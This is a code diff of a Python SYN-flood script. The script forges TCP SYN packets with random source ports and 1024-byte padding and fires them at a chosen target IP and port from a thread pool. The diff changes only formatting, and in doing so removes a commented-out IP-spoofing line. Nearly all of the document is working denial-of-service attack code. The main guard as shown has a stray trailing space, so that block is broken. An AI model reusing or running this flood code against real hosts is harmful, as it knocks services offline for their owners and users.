@@ -10,9 +10,10 @@ import sys
 import time
 
 def syn_flood(target_ip, target_port):
-    # forge IP packet with target ip as the destination IP address
+    """"
+    Forge IP packet with target ip as the destination IP address
+    """
     ip = IP(dst=target_ip)
-    # ip = IP(src=RandIP("10.2.0.1/24"), dst=target_ip) # with random IPs (spoofing)
     tcp = TCP(sport=RandShort(), dport=target_port, flags="S") # the flag "S" indicates the type SYN
     raw = Raw(b"A"*1024)
     packet = ip / tcp / raw
@@ -35,5 +36,5 @@ if __name__ == "__main__ ":
         for future in concurrent.futures.as_completed(futures):
             if future.result():
                 executor.shutdown(wait=False)
-                print('Time taken :', time.time() - start_time)
+                print(f"Time taken : {time.time() - start_time}")
                 sys.exit(0)
